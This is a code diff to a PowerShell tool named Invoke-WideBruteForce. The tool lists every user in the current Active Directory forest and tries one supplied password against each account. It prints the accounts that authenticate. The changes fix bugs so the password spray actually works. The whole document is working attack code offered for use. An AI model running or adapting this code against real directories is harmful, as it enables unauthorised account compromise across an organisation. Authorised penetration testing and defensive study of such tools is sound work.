@@ -9,7 +9,7 @@ function Invoke-WideBruteForce
 {
 <#
     .SYNOPSIS
-        This tool provides tries a password on all the users within the current directory (the entire forest).
+        This tool tries a given password on all the users within the current directory (the entire forest).
         Author: Itamar Mizrahi (@Zecured)
         License: GNU v3
         Required Dependencies: None
@@ -31,43 +31,38 @@ function Invoke-WideBruteForce
 
     )
 
+    
+    Function Test-ADAuthentication {
+        param($Username,$Password)
+        (new-object directoryservices.directoryentry "",$Username,$Password).psbase.name -ne $null
+    }
+
+
     $AllUsers = @()
     $objForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
     $DomainList = @($objForest.Domains)
-    $Domains = $DomainList | foreach { $_.name }
-    foreach ($Domain in $Domains)
+    foreach ($Domain in $DomainList)
     {
         $strFilter = "(objectCategory=User)"
-        $objDomain = New-Object System.DirectoryServices.DirectoryEntry
-        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher
-        $objSearcher.SearchRoot = $objDomain
+        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher($Domain.GetDirectoryEntry())
         $objSearcher.PageSize = 10000
         $objSearcher.Filter = $strFilter
         $objSearcher.SearchScope = "Subtree"
-        $colProplist = "samaccountname"
-        foreach ($i in $colPropList)
-        {
-            $objSearcher.PropertiesToLoad.Add($i)
-        }
+        $objSearcher.PropertiesToLoad.Add("samaccountname") | Out-Null
         $colResults = $objSearcher.FindAll()
         foreach ($objResult in $colResults)
         {
-            $AllUsers += $objItem.samaccountname
+        
+            $AllUsers += $Domain.name.ToString() + "\" + $objResult.Properties.Item("samaccountname")
         }
     }
 
-    $verifiedUsers = @()
     foreach ($user in $AllUsers)
     {
-        if(Test-ADAuthentication $user.SamAccountName $password)
+        if(Test-ADAuthentication $user $password)
         {
-            $verifiedUsers += $user.SamAccountName
+            Write-Host $user
+            Start-Sleep -Seconds 30
         }
     }
-}
-
-
-Function Test-ADAuthentication {
-    param($Username,$Password)
-    (new-object directoryservices.directoryentry "",$Username,$Password).psbase.name -ne $null
 }
